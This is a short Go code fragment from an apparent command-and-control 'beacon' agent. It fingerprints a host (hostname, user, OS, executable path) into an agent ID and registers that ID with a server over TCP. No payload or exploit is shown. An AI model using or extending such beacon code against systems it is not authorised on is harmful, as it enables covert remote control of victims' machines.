// Registration methods

func (b *GoBeacon) generateAgentID() string {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	username := "unknown"
	if currentUser != nil {
		username = currentUser.Username
	}

	systemInfo := fmt.Sprintf("%s%s%s%s", hostname, username, runtime.GOOS, runtime.GOARCH)

	executable, _ := os.Executable()
	systemInfo += executable

	hash := md5.Sum([]byte(systemInfo))
	return hex.EncodeToString(hash[:])[:8]
}

func (b *GoBeacon) register() error {
	// Include schema filename for auto-assignment on server
	message := fmt.Sprintf("register|%s|%s|%s", b.AgentID, b.ComputerName, b.Schema)
	b.Logger.Printf("Attempting registration: %s", message)

	response, err := b.sendTCP(message, true)
	if err != nil {
		return err
	}

	b.Logger.Printf("Registration response: %s", response)
	return nil
}
